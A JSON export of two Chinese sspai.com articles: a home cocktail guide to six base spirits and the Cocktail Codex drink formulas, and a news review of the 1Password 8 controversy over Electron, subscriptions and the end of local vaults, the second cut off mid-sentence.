[{"title":"居家不止冰啤酒 ，这份「家庭鸡尾酒」调制公式敬请收藏","date":"2021-09-23 09:31:07","description":"\n<blockquote><p>我喜欢酒吧刚开门迎接傍晚客人的时候。屋里的空气还凉爽干净，所有东西都亮晶晶的，酒保正在最后一次照镜子，看领带正不正、头发光不光。我喜欢架子上整整齐齐的酒瓶和闪闪发亮的可爱酒杯，还有那种期待的感觉。我喜欢看着酒保调当晚的第一杯酒，放在清清爽爽的杯垫上，旁边还要放一块叠得漂漂亮亮的餐巾。我喜欢慢慢地品这杯酒。一个安静酒吧里傍晚第一杯安静的鸡尾酒 —— 真是美妙。</p></blockquote>\n<p>想了好久，还是打算用钱德勒「漫长的告别」里面的这一段来做这篇文章的开头。喝酒这件事，在长久以来的历史上，都带有一定的浪漫主义色彩。不论是古代诗人们酒后「斗酒诗百篇」，还是禁酒令时期可爱的人们为了喝上一口酒而留下的一段段传奇的故事，都不断的给「酒」的浪漫添砖加瓦。</p>\n<p>对于酒，我想大多数能够享受它的人，喜欢的都是它给人带来的微醺感觉，让整个人松弛下来，给不管是独处还是朋友聊天带来的那种惬意慵懒的氛围。而调酒，得益于它千变万化的形态与口味，就是一种即使不喝酒的人可能也会喜欢的饮品。</p>\n<h2>就像照片中的主体</h2>\n<p>在鸡尾酒的世界里，基酒就好像是一杯酒的灵魂一样，从本质上决定了这杯酒的气质。如果用摄影做比喻的话，就像一张照片中的主体，能牢牢吸引住观者的目光，哪怕是匆匆一瞥。在这些年的酒的发展过程中，大家逐渐对于调酒使用的基酒的几个品类有了一个统一的认识，大概分为以下六种。</p>\n<h3>温暖的麦子 - 威士忌 Whiskey</h3>\n<p>威士忌这款酒，本身就足以洋洋洒洒写一大篇文章来介绍，从产地、风味、风土等等。在这里给自己挖一个坑，日后等到自己喝的足够多了，再来专门写吧。作为调酒的基酒，如果用到很贵的威士忌的话，会略显奢华，这这个意义上来讲，市面上比较好买的一些平价威士忌，例如 Jim Beam 波本就是很好的入门调酒选择。不过，可能波本威士忌本身的风味对于一些人来说是需要一些适应时间的，我就是一些人中的其中一员。本来以为差点要放弃威士忌这个品类，直到我接触了苏格兰威士忌，强烈推荐 Speyside 花果香的单一麦芽作为入门款。</p>\n<h4>代表调酒 Old Fashioned</h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/c621739073e7cabc6d2e314164f120dd.jpg\"><figcaption>Picture from Cocktail Codex</figcaption></figure><p>作为这款基酒的代表调酒，Old Fashioned 从名字上就自亮身份，历史悠久，是经典的调酒。通常来说，越是经典的东西就越是简单，所以这款酒的调制方式也简单无比：只需要一块方糖，2-3滴苦精，再加入2 shot 波本威士忌最后以橙皮装饰即可。</p>\n<p>在具体操作的时候，可以将方糖、苦精和波本放入调制杯中加满冰块，搅拌至酒体降温，然后古典杯放入大冰块，再倒入降温完成的酒体，然后拧出橙皮皮油最后放入杯中装饰。</p>\n<p>Old Fashioned 是一杯颜值非常取决于杯子的酒，条件允许的话建议买一个好看的古典杯，平时用来纯饮威士忌或者调酒都很不错。</p>\n<h3>热情的多肉 - 龙舌兰 Tequila</h3>\n<p>对于 Tequila 的认知，恐怕很多人都和我一样是从 Shots 开始的。柠檬、食盐、喧嚣的 Pub、热烈的气氛，光是这几样，基本上酒定义了它本身的气质。这个来自墨西哥的极富地域风情的酒，带给人的是一种热烈的感觉。抛开这种极具仪式感的喝法，相信我，龙舌兰纯饮并没有想象中的那么美妙。用时下比较流行的词语来说，大概龙舌兰是一种「氛围感」烈酒。</p>\n<h4>代表调酒 Tequila Sunrise</h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/1173d0b3c948ba7a89b668d81ed24490.jpg\"><figcaption>Picture from Cocktail Codex</figcaption></figure><p>Tequila Sunrise 是一款颜值上给人以「人畜无害」的感觉。橙汁的黄加上红石榴糖浆的红色很好的营造出了一种日落的氛围。制作方式也是简单至极，拿一个高球杯，装满冰块，加 1 shot Tequila，橙汁补至七分满，用吧勺搅拌，再将 10ml 红石榴糖浆沿吧勺留下。Tequila 本身的烈酒味被橙汁很好的盖住了，所以喝起来酒精感也没有那么重，我愿称之为「新手友好第一杯」。</p>\n<h3>不太甜的甘蔗 - 朗姆酒 Rum</h3>\n<p>由于酒的酿造本质，决定了酒本身和农作物之间有着千丝万缕的联系。朗姆不同于其他大多数以谷物为原料的酒的就是它是以甘蔗为基底的。但如果你以为用甘蔗酿造的酒会带有甘蔗淡淡的甜味，那恐怕就错了。朗姆澄清的白色酒体，入喉辛辣，绝对是喝醉之前不会纯饮的一种酒。</p>\n<h4>代表调酒 Rum and Coke</h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/8ef90a7c4bfab033ff6f080572b22709.jpg\"><figcaption>Cuba Libre from My Home Bar</figcaption></figure><p>这可能是我在家最喜欢做的一杯酒。Rum and Coke 还有一个更加浪漫的名字 Cuba Libre （自由古巴），是一杯非常清爽可口的 Highball 鸡尾酒。坊间传闻这杯酒起源于 20 世纪初的古巴，历史背景是当时古巴在美西战争中取得了独立，Cuba Libre 也是古巴独立运动的口号，当时因为其配方简单原料价格低廉，成为最受欢迎的酒精饮料之一。</p>\n<p>制作过程很简单，在杯中加满冰块，加入柠檬汁 5 ml，加入3滴苦精，再加入1 shot 朗姆然后搅拌让酒体充分冷却，然后再用可口可乐加满，提拉Stir，最后用黄柠檬皮拧出气雾，放入杯中。喝起来酸酸甜甜又起起泡泡，简直是夏日必备饮品。</p>\n<h3>疯狂的土豆 - 伏特加 Vodka</h3>\n<p>来自战斗民族的伏特加，秉承了战斗民族的特性，在酒中追求的是纯净度而不是风味。虽然背负着生命之水的美名，但是伏特加作为基酒在调酒的世界里还是非常的万金油，与各种酒搭配在一起都非常的协调，丝毫不出挑。</p>\n<h4>代表调酒 Moscow Mule</h4>\n<p>和 Cuba Libre 一样，我认为这也是一杯特别适合炎炎夏日的一杯调酒，冰冰凉凉，气气泡泡。同时我认为这可能是在酒吧最有辨识度的一个酒，因为它的容器比较特别，要用标志性的铜杯容器。这个容器就涉及到这杯酒的起源了，虽然不知真假，不过调酒后面这些传奇性的故事往往是酒文化最有意思的地方。这杯酒的三种主要元素，铜杯，伏特加和姜汁啤酒再当时美国都面临着营销上困扰，销售停滞，于是这三个人某天一拍即合决定用这三个东西做一杯调酒来带动这三类产品的销售额，莫斯科骡子就诞生了。</p>\n<p>这杯酒调制方法也非常简单，把 15ml 柠檬汁（最好是青柠汁）挤到杯子里面，加入 1 shot vodka，再加入满杯碎冰，最后加入干姜味的汽水或者姜汁啤酒轻轻搅拌，最后再加入一片柠檬角。</p>\n<h3>穿着白大褂的杜松子 - 金酒 Gin</h3>\n<p>虽然说不是所有的 Gin 都是以杜松子为主要调味，不过在大多数情况下称 Gin 为杜松子酒应该也是没有问题的。Gin 是我认为喝到嘴里之前最香的酒，各种个样的调味加上杜松子的主要香气，真的很让人上头。</p>\n<p>有趣的是，金酒的诞生传说是作为药品来的。因为杜松子传统上一直被当作利尿、解热与治疗痛风的药材使用，所以 Gin 最开始是被当作利尿剂来使用的。</p>\n<h4>代表调酒 Gin Tonic</h4>\n<p>Gin Tonic 应该是以 Gin 为基酒的调酒里面知名度最高的一杯，深受大家喜爱。调制方法是标准的 Highball 调制方法，拿一个冻过的高球杯，满冰，加入 1 shot Gin，再加满汤力水，提拉 Stir，挤一些柠檬皮油，再用柠檬皮做装饰。</p>\n<p>正如 Gin 的诞生和医学相关一样，Gin Tonic 这杯酒也带有疗愈的色彩。在殖民时代，在热带地方作战的欧洲士兵会饮用奎宁水（Quinine，主要用途是解热与对抗疟疾）来抵御热带疾病，但是奎宁水本身非常的苦涩难以下咽，所以这些海外作战的士兵发现加入 Gin 会让奎宁水变好喝，这种配方后来被带回祖国之后就渐渐演变成了如今我们饮用的 Gin Tonic。</p>\n<h3>高贵的葡萄 - 白兰地 Brandy</h3>\n<p>作为一种以葡萄为原料酿造而成的蒸馏酒，闻起来味道就酸酸甜甜感觉很好喝，也难怪白兰地通常被称为「葡萄酒的灵魂」，以法国干邑地区的最为著名。为什么被称为「葡萄酒的灵魂」呢，因为最开始白兰地是为了解决葡萄酒变质滞销的问题，就用葡萄酒作为原料加工成葡萄蒸馏酒。这时期加工的葡萄蒸馏酒还是无色。后来人们偶然发现存于橡木桶中的葡萄蒸馏酒味道更加的芳香浓郁，酒体颜色也变成了琥珀色，所以奠定了当代白兰地的酿造方式 - 发酵、蒸馏、贮藏。</p>\n<h4>代表调酒 Sidecar</h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/f5d9b865112b261f19c6f6d5dd133963.jpg\"><figcaption>Picture from Cocktail Codex</figcaption></figure><p>Sidecar 是一杯典型的 Daiquiri 架构（后面会详细解释）的鸡尾酒，调制相对来说也不复杂，1 shot 干邑白兰地，加入15 ml 君度橙味利口酒，再加15 ml 柠檬汁，加冰 shake，最后也是最重要的一步：倒入好看的高脚杯中。</p>\n<p>至于为什么叫做 Sidecar，正如很多酒的来源不可考一样也没有非常确实的来源，有一种说法我觉得还蛮有意思，是指酒吧在给客人上酒的时候，用摇壶将酒倒出后，为避免浪费，摇壶中剩下的一小部分回倒入一个小杯子中，和主酒一起上，就像挎斗摩托车一样。</p>\n<h2>解构鸡尾酒</h2>\n<p>虽然在鸡尾酒的世界里基酒只有六大类，可是以这几种基酒搭配调制而成的鸡尾酒却是难以尽数。在《Cocktail Codex》这本书中，将调酒分为了六大类，相当于总结了六个万能公式，搞懂了这六种公式之后，基本上可以套用任何一种名字看起来奇奇怪怪的酒。</p>\n<p>当然我认为这六大类在现实生活中更有用的一方面是，它提供了一种架构性的思路，给去酒吧的你提供了一些指导性建议。例如，你想要一个什么烈酒作为基底，想要一些偏酸还是偏甜的风味。或者你有一种喜欢的鸡尾酒，如果知道了它属于哪一种架构，可以尝试着根据这种架构去换着点一些有趣的其他风味，酒保一般是不会拒绝这种有想法的客人的。跳出酒单上奇奇怪怪的名字，直击风味的本质，做个酷酷的酒吧常客。</p>\n<h3>The Old-Fashioned</h3>\n<p>第一种就是上面介绍基酒中举的例子，它的公式如下：</p>\n<blockquote><p>烈酒 + 糖 + 苦精 + 冰 + 柑橘水果做装饰</p></blockquote>\n<p>如果用这个公式去看的话，各种基底的 Old fashioned，Sazerac 等调酒，都算是这种搭配架构下的鸡尾酒。在这个公式的基础上延展开来的话，一杯很适合冬天的热调酒 Hot Toddy 其实也是这种架构，同样是威士忌（烈酒）+ 方糖 + 苦精 + 柠檬装饰，唯一的变化是冰变成了热水。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/20/bec178a05063a49da1c7521510f962d6.JPG\"><figcaption>Hot Toddy from My Home Bar</figcaption></figure><h3>The Martini</h3>\n<p>第二种是以 Martini 这种架构来调制的酒，它的公式如下：</p>\n<blockquote><p>烈酒（一般为金酒或者伏特加） + 加香型葡萄酒</p></blockquote>\n<p>Martini 本身不用说是用 Gin 加上 Vermouth 调制，可以用同种架构来解释的还有比如说 Negroni，Manhattan 等等。就拿我常做的 Negroni 举例来说，如果按照 Martini 这种架构来解释的话，是金酒（烈酒）做底，再加入 Sweet Vermouth （加香型葡萄酒），那么剩余的两种原料中，Campari 提供了 Negroni 里面的苦味并和 Sweet Vermouth 里面的甜做了一种很好的苦甜中和，最后装饰用一片橙皮。</p>\n<p>Negroni 虽然从做法上来看，是一杯很简单的酒，但其实，其中的苦苦甜甜的配比真的要看个人喜好来慢慢尝试。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/c6217f107dbaf45b1d3b27c2d98d1b3c.jpg\"><figcaption>Negroni from My Home Bar</figcaption></figure><h3>The Daiquiri</h3>\n<p>第三种是 Daiquiri 架构的调酒，公式如下：</p>\n<blockquote><p>烈酒 + 柑橘酸 + 糖</p></blockquote>\n<p>这其中有非常火的就比如 Whiskey Sour (威士忌酸)还有 Gimlet (螺丝起子)。如果看过钱德勒「漫长的告别」的这本书的话，应该对螺丝起子这杯酒非常熟悉，因为这是男主去酒吧经常点的一杯酒，书中是这样描述的：</p>\n<blockquote><p>我们坐在维克多餐厅的酒吧一角喝螺丝起子。“这儿不会调酒，”他说，“他们所谓的螺丝起子只是青柠或柠檬汁兑金酒，加一丁点儿砂糖和苦味酒。真正的螺丝起子是一半金酒一半罗斯牌青柠汁，其他什么都不加。能打得马丁尼落荒而逃”</p></blockquote>\n<p>在书里，就已经写出了这杯酒的调制方法，不同于 Daiquiri 本身使用 Rum 作为烈酒基底，Gimlet 用的是金酒，再加上青柠汁的酸，再加上简单糖浆，几乎可以完美的用这个架构来解释。另外如果你想要打得 Martini 落荒而逃的话，记得要用螺丝牌青柠汁哦（手动狗头）。</p>\n<h3>The Sidecar</h3>\n<p>第四种架构是 Sidecar，公式是：</p>\n<blockquote><p>烈酒 + 柑橘酸 + 利口酒</p></blockquote>\n<p>Sidecar 本身用这种架构解释的话，就是：干邑（烈酒）+ 柠檬汁（柑橘酸）+君度（橙味利口酒）。如果我们把核心的烈酒基底换成 Tequila 的话，那我们就可以很轻松的解锁另外一种酒 Magarirta。如果把烈酒换成金酒的话，就是 White Lady。那么同样的逻辑，我们把提供风味的橙味利口酒换成其他水果风味的话，会解锁更多的调酒，你甚至可以创造一款属于带有自己个人家乡或者风味印记的调酒。</p>\n<p>另外值得一提的是，Sidecar 架构的调酒，可以很好的去练习「沾盐边」这个技巧。我个人的经验之谈是，不要用杯壁很厚的杯子去沾盐边，要保证杯子完全干燥之后再用柠檬角湿润杯边。</p>\n<h3>The Whiskey Highball</h3>\n<p>第五种架构就是 Whiskey Highball，也是最适合夏日畅饮的调酒架构，公式如下：</p>\n<blockquote><p>一份烈酒 + 两份长饮</p></blockquote>\n<p>其中，长饮就比如姜汁汽水，汤力水，气泡水，果汁等。前面介绍的 Cuba Libre 就属于这种架构，还有深受喜欢的 Gin Tonic也是。最近大火的便利店调酒大多数也属于这种调酒架构。所以，知道了这个架构之后，可以去自己探索一下便利店调酒的快乐啦！</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/13/6efd827369bfbe76b425bcea77415afe.jpg\"><figcaption>Bloody Mary from My Home Bar</figcaption></figure><h3>The Flip</h3>\n<p>第六种架构是 Flip，是一种偏奶味向的一种调酒架构，公式如下：</p>\n<blockquote><p>烈酒/葡萄酒 + 蛋/奶 + 糖</p></blockquote>\n<p>在 Cocktail Codex 这本书里面对于 Flip 的描述是这样的：</p>\n<blockquote><p>Flip - A drink comprised of booze, sugar and whole egg, served cold</p></blockquote>\n<p>但其实在实际操作层面，用生鸡蛋涉及到更加复杂的卫生问题以及处理方式，在这种架构下家庭调酒建议可以尝试的就比如 White Russia 这种完全用不到鸡蛋的咖啡风味调酒。里面的蛋/奶元素完全用奶油或者奶来替代。另外大家更加耳熟能详的可能是 Irish Coffee （爱尔兰咖啡），就使用 威士忌（烈酒）+ 咖啡（风味）+ 糖浆 + 奶油 来调制而成的。调制热酒一个重要的步骤是提前用热水热杯，而且记得最好用个「带把儿」的杯子。</p>\n<h2>还有一些没说的</h2>\n<p>正如好多有趣但可能并无用的事情一样，调酒这件事，是一项复杂而繁琐的系统工程。这篇文章里面，并没有讲述完全的包括但不限于以下一些事情，希望以后能够慢慢和大家一起学习分享。</p>\n<ul>\n<li>调酒器具</li>\n<li>炫酷又无用（或有用）的调酒技法</li>\n<li>可爱又好看的杯具们</li>\n<li>基础的家庭吧台配置</li>\n<li>预调制糖浆的分类以及保存方法</li>\n<li>奇奇怪怪香味利口酒</li>\n</ul>\n<p>在调酒的世界里，我也只是个入门者，凭借着下班后一点点时间自己学习探索，称其为放松身心的一种方式也未尝不可。Home Bar 的酒和调酒器具大多都是一瓶瓶一件件买回来的，是觉得自己想要调一杯酒的时候发现缺了某种原料才去买的。所以也许，对于还在「调酒」这件事门口踟蹰或者看了这篇文章想要进门的你来说，可以从一杯简单的 Highball 开始，尝试一下自己制作「吨吨吨」的快乐。</p>\n","link":"https://sspai.com/post/68125"},{"title":"订阅、云服务、套壳——关于 1Password 8 的是非争议","date":"2021-09-23 07:31:22","description":"\n<h2>导读</h2>\n<p>欢迎阅读「网事深读」栏目。这是我们为会员准备的科技资讯栏目。</p>\n<p>与注重时效的常见资讯类内容不同，「网事深读」只关注距最初发生已有一段时间的事件。我们认为，「科技新闻」似乎已成了一个矛盾体——互联网号称有永恒的记忆，却能转身间将轰动一时的讨论冲刷殆尽；看似无限包容，却往往只给最偏颇的声音递上传声筒。在这样的背景下，要全面、中立地观察事件，有一段「静置期」是必要的。</p>\n<p>本栏目内容通常由三部分组成：</p>\n<ul>\n<li>在第一部分（事件梳理）中，我们将按时间顺序整理事件截至当前的发展过程，并补充必要的背景信息，帮助读者了解来龙去脉。为此，我们将尽量引用来自当事方的第一手说法，或引述相对中立的第三方报道。</li>\n<li>在第二部分（支持/反对观点）中，我们则汇总关于事件具有代表性的观点，根据其正反立场分类，使读者能兼听多个角度的意见。</li>\n<li>在第三部分（相关事件/延伸阅读）中，我们将挑选一些与话题相关的事件或讨论，作为「他山之石」启发思考。</li>\n</ul>\n<p>你可能发现上述结构并没有为我们自己预留表达观点的空档；这是有意为之的选择——退到幕后，承担「递话筒」的职能，帮助读者能在博闻众说的基础上做出自主判断。</p>\n<p>当然，如果你对本栏目话题有任何补充材料或见解，欢迎在评论区或会员话题群一起分享、讨论。</p>\n<hr>\n<h2>事件梳理</h2>\n<p><a href=\"https://1password.com/\">1Password</a> 是一款知名的密码管理工具，运营主体为加拿大公司 AgileBits, Inc.。</p>\n<p>1Password 最初发布于 2006 年，当时只有 Mac 版，密码库以一个独立数据库的形式存储在本机硬盘、或用户指定的 Dropbox 等第三方网盘中。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/19/article/cbaf6a2eb6308f8aa9df9d738285125a\" alt=\"\"></figure><p>后来，1Password 逐渐扩展到 iOS、Android、Windows 等平台，并于 2015 年末推出了自己的同步服务（<a href=\"http://1password.com/\">1Password.com</a>），许可收费模式也改为以订阅制为主，但独立密码库功能和买断制许可仍然保留。</p>\n<p>2021 年 5 月，1Password 团队宣布推出 Linux 版客户端。根据在同期发表的 <a href=\"https://dteare.medium.com/behind-the-scenes-of-1password-for-linux-d59b19143a23\">Medium 文章</a>，该版本使用了一种「混合」架构，其中前端（软件界面）部分使用 Electron 框架编写：</p>\n<blockquote><p>1Password for Linux 是我们第一款混合 [架构] 应用。[…] <strong>后端</strong>用 Rust 写成，这个语言以其安全性和高性能而闻名。</p></blockquote>\n<blockquote><p>[…] <strong>前端</strong>使用 web 技术，这让我们得以能打造 1Password 的全新设计语言；不仅美观，而且让我们 [的开发工作] 高度敏捷、快速迭代。在为 <a href=\"http://1password.com/\">1Password.com</a> [上的网页版] 和浏览器插件开发界面时，我们就用了 TypeScript 和 React，并大获成功。因此，这次 [继续使用这些框架] 也就是自然而然的选择了。</p></blockquote>\n<blockquote><p>我们此次发布 Linux 版的主要目标之一，就是打造一个<strong>共用的内核</strong>，其作用在于与 <a href=\"http://1password.com/\">1Password.com</a> [上的服务端] 通讯，并集中完成尽可能多的计算任务。我们希望在所有客户端共用一个代码库，实现集中开发功能、一次性修正漏洞。我们还希望通过组件架构的设计，避免这个共用的内核不会被恶意利用。</p></blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/19/article/18657924e6cb05f910db1af9e6f7bd01\" alt=\"\"></figure><p>随后，在 8 月，1Password 团队<a href=\"https://blog.1password.com/1password-8-for-mac-is-now-in-early-access/\">宣布</a> Mac 平台的下一版本——1Password 8 进入初期测试（early access）阶段，并开放下载。</p>\n<p>根据同期发布的<a href=\"https://appleinsider.com/articles/21/08/16/users-lobby-1password-to-abandon-new-electron-version\">官方博客文章</a>，不同于该软件过去在 Mac 平台一直坚持的原生框架开发路径，1Password 8 也已转向与 Linux 版相同的混合架构，即使用 Electron 框架编写用户界面，而原因则是「不得已而为之」：</p>\n<blockquote><p>如何为 macOS 开发 1Password 8，可能是我们做过的最复杂的决策。[…] 我们决定采取「双分支」的做法，开发两个 Mac 应用。其中一个用 SwiftUI 编写，面向最新版操作系统；另一个使用网页 UI，从而支持旧版系统。</p></blockquote>\n<blockquote><p>尽管 SwiftUI 让我们在 iOS 和 macOS 版本之间可以共享代码的比例达到有史最高，我们还是发现需要为某些组件单独开发 [两种] 实现，才能在相应的系统上显得自然，有时整个功能都得单独开发。[…]</p></blockquote>\n<blockquote><p>最终，我们痛苦地决定停止用 SwiftUI 开发 Mac 应用，把 SwiftUI 的开发集中在 iOS 上，靠 Electron 版应用支持所有版本的 Mac 操作系统。</p></blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/19/article/b56edae2441dbc861bf7b7fcbb62433b\" alt=\"\"></figure><p>与开发框架的变动同步，1Password 8 的付费模式也发生了变化，取消了一直存在的「买断制」许可，只保留近年新增的订阅制。</p>\n<p>不过，官方最初并没有明确指出这一点，只是到了用户在官方论坛发帖质询后，创始人 Dave Teare 才<a href=\"https://1password.community/discussion/comment/601917/#Comment_601917\">出面回应</a>：</p>\n<blockquote><p>鉴于 1Password 会员服务备受欢迎，而 <a href=\"http://1password.com/\">1Password.com</a> [的网页版服务] 在功能上远胜其他 [既有客户端]，我们下一代 1Password 应用将专注于会员 [订阅制服务]。[…] 现在是时候告别独立买断许可证了。</p></blockquote>\n<p>对现有买断制用户，则提供专属优惠鼓励迁移：</p>\n<blockquote><p>[为表感谢，] 只要将你的现有许可证邮件发给我们，即可获得三年期的五折优惠。[…] 我们理解有人希望只在明确同意时付款；如果是这样，我们也提供了一项特惠：你可以花 99 美元购买一张价值 150 美元的礼品卡，足够使用 1Password 三年多。</p></blockquote>\n<p>在<a href=\"https://1password.community/discussion/comment/602340/#Comment_602340\">另一则回复</a>中，Teare 则明确表示将停止提供独立密码库的功能，但不排除未来推出自建（self-host）服务端的选项：</p>\n<blockquote><p>下一代 1Password 应用将仅能与 <a href=\"http://1password.com/\">1Password.com</a> [上的订阅制服务] 同步。[…] [Mac 上的] 1Password 7 不受影响，现有的同步方式均能继续使用。</p></blockquote>\n<blockquote><p>[…] 我们已经在琢磨允许用户自主搭建云服务的思路。那将成为你个人专属的 1Password 服务，完全运行在你的主机，或者你掌控的云端。但一个大问题是：有多少用户朋友需要这个功能？[…] 请参与<a href=\"https://1password.community/home/leaving?allowTrusted=1&amp;target=https%3A%2F%2Fsurvey.1password.com%2Fself-host%2F\">这项调查</a>，帮助我们进一步理解你的使用场景。</p></blockquote>\n<h2>反对观点</h2>\n<p>1Password 宣布上述开发方向和商业模式调整后，受到了大量质疑。</p>\n<p><strong>最多的批评意见集中于改用 Electron 开发 Mac 版的决策。</strong> 常见的角度包括：</p>\n<ul>\n<li>新版界面显得不够「原生」。即使 1Password 8 在设计上试图模仿 Mac 原生应用的外观，但受限于 Electron 框架基于网页技术的本质，仍然留下了很多露出「套壳」本性的破绽。最典型的例子就是「偏好设置」界面——不再是独立的窗口，而是位置固定的一个模态对话框。</li>\n<li>Electron 在安全性方面的历史称不上光彩。过去几年中被发现的安全漏洞曾影响到 Slack、Skype 等知名应用，可能导致任意执行代码等后果。尽管这不能代表 Electron 当下的安全状况，但考虑到 1Password 作为敏感信息管理工具的定位，的确不免让人产生「自废武功」的担心。</li>\n<li>一些反馈称 Electron 版本的 CPU、内存资源占用和耗电都高于原生版本（值得注意的是，这方面目前并无严谨测试结果，不少评论更是只看到 Electron 就直接得出了吃性能和耗电的结论）。</li>\n<li>受限于 Electron 目前对 ARM 架构的适配进度，针对 Intel 和 Apple Silicon 机型的安装包不能通用（即提供 Universal Binary 版本），只能分别提供。</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/19/article/ecfb6d1aa93da2fd5930a05e12f1d2df\" alt=\"\"></figure><p>相比之下，<strong>对于全面采用订阅制的批评则相对没有那么密集</strong>。这或许是因为 1Password 已经在过去几年中逐步淡化买断制许可的地位（只留下一个很不明显的购买入口，需要花一番工夫才能买到），而不能接受订阅制的用户已有相当比例先行离开了。此外，仅从成本上计算，官方为老用户提供的前述优惠方式也确实并不会比定期购买大版本升级花费更多。</p>\n<p>不过，仍然有一些观点<strong>对仅保留订阅制、以及相关的取消独立密码库的变更提出了合理质疑</strong>。</p>\n<p>例如，名为「MikeV99」的用户对于订阅制的价值<a href=\"https://1password.community/discussion/comment/603660/#Comment_603660\">提出</a>了一种尽管罕见、但也引人思考的疑问：</p>\n<blockquote><p>我夫人今年 80 岁了，我明年一月也要满 80 岁。我做了你们这么多年顾客，升级过很多版本。如果我不按年订阅，终身订阅要收多少钱？</p></blockquote>\n<p>名为「thundersparrow」的用户则<a href=\"https://1password.community/discussion/comment/606748/#Comment_606748\">提出</a>了一种可以接受订阅制、但不能接受在线密码库的合理场景：</p>\n<blockquote><p>我是个技术支持顾问，为多个客户工作。对于每个客户，我都会创建一个本地密码库存放这位客户的密码。</p></blockquote>\n<blockquote><p>我使用 Tresorit（类似于更安全的 Dropbox）作为主要的数据同步服务，通过它的文件夹同步功能来同步 macOS 上的所有 1Password 密码库。这在多台 macOS 设备上运行良好，甚至还能用来和为同一客户工作的同事协作。</p></blockquote>\n<blockquote><p>我还会选择一些密码库，通过无线局域网同步功能同步到 iOS 设备上。我没有任何一个密码库通过 <a href=\"http://1password.com/\">1Password.com</a> 同步。[…]</p></blockquote>\n<blockquote><p>我不会接受把密码库迁移到 <a href=\"http://1password.com/\">1Password.com</a> 上，因为这违反了「分而治之」（the separation of concerns）的原则。</p></blockquote>\n<p>还有一些意见<strong>对 1Password 快速融资、投入企业市场提出质疑</strong>，认为这反映了一种「忘记初心」的倾向。这里的背景是 1Password 团队于 2019 年和 2021 年两次接受风险投资机构 Accel 的投资，投资额分别为 2 亿和 1 亿美元，投后估值已达到 20 亿美元。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/19/article/a72b0389085169eb46edf72b32ab952c\" alt=\"\"></figure><p>例如，开发者 Drew McCormack <a href=\"https://twitter.com/drewmccormack/status/1426586869408665606\">认为</a>：</p>\n<blockquote><p>我得承认当初没理解 1Password 拿风投的原因。回头看来，我没意识到它已经不再是个密码管理应用，而蜕变成一个账户托管服务了。这就很说得通了。弯转得妙啊。</p></blockquote>\n<p>此外，不少用户表示比起功能和价格变化，更令他们感到不满的是<strong>官方避重就轻、顾左右而言他的回应态度</strong>。</p>\n<p>例如，Hacker News 用户「bgentry」<a href=\"https://news.ycombinator.com/item?id=28143821\">表示</a>：</p>\n<blockquote><p>最可气的地方在于他们的客服团队一上午都在 Twitter 上误导别人，而不是老实回答新版是不是 Electron [写的]，[说什么 「<a href=\"https://twitter.com/1Password/status/1425429965747720200\">还是原生的</a>」「<a href=\"https://twitter.com/1Password/status/1425429965747720200\">后端是用 Rust 写的</a>」「<a href=\"https://twitter.com/1Password/status/1425470169133031435\">更快更灵敏</a>」。]</p></blockquote>\n<p>用户「kup0」则<a href=\"https://news.ycombinator.com/item?id=28148070\">表示</a>：</p>\n<blockquote><p>号称「顾客用钱包投票」选择了订阅制是很虚伪的。[…] 作为软硬件用户，我情绪上真的很烦老是遇到这样的反衬：喜欢一个产品、却对做产品的公司极度失望。</p></blockquote>\n<h2>支持观点</h2>\n<p>尽管质疑声音颇多，也有不少一些观点则对 1Password 表达了支持，或至少表示理解。</p>\n<p>一些人指出，<strong>对 Electron「膝跳反应」式的批评是非理性的</strong>。较有代表性的是开发者 Thaddeus Ternes 的<a href=\"https://twitter.com/thaddeus/status/1427005912842133512\">推文串</a>：</p>\n<blockquote><p>UI [用户界面] 工具的决策和开发时间是一大商业风险。在 Apple 平台上，新工具的功能几乎从不会向后移植到旧版。选择支持旧版操作系统，就要放弃 [新的] 平台功能。相反，如果选择新工具，目标受众就很有限，每年增增减减的意外 [功能] 变动也只能由你承担。</p></blockquote>\n<blockquote><p>但如果选择 Electron，就能 [兼顾] 支持旧版的系统和现代的功能，功能支持和排期也有清晰的路线图。Electron 实际上是一种降低开发风险的方式（有的服务商过去几十年就是靠帮人降低开发风险赚了大钱）。甚至可以说 Apple 的保密就是在强迫别的公司去用 Electron。</p></blockquote>\n<blockquote><p>我本身并不很喜欢 Electron，但考虑到做软件生意的各种内在挑战，如果能不花钱就将风险转移出去，那是很有吸引力的。</p></blockquote>\n<p>另一些观点指出，1Password 弃用原生框架而转采 Electron 的决策中，<strong>Apple 作为第一方、怠于提供良好的开发框架，也有一部分责任</strong>。Jason Snell <a href=\"https://sixcolors.com/post/2021/08/not-important-enough-1password-abandons-its-native-mac-app/\">撰文指出</a>：</p>\n<blockquote><p>问题的根源在于：1Password 是以「亲 Mac 阵营开发者」的身份起家的，现在却认定 Mac 不够重要了。[官方博客文章] 很清楚地表明了 AgileBits 的优先级。[…] AgileBits 愿意在 iOS 上多花功夫 [使用 SwiftUI 开发]，因为这是个重要的平台，而 SwiftUI 显然是它的未来。但在 Mac 上实现 SwiftUI 就要做很多重复工作了。[…] [他们博客文章等于在说，] Mac 很重要，但没有重要到让我们做一个专属应用。这道出了 Mac 软件未来之痛。</p></blockquote>\n<blockquote><p>Apple 也难避其咎。如果 SwiftUI 真的是一统 Apple 各平台的钦定工具，那 1Password 就会用上了。[…] 一个历史悠久、受人喜爱的 Mac 应用被扔进废纸篓，被一个网页应用取而代之。这事不是没有先例；不幸的是，也不会后无来者。</p></blockquote>\n<p>还有人认为，<strong>并不存在一种一以贯之的「原生 Mac 应用设计」</strong>（有时被称为「不妥协的 Mac 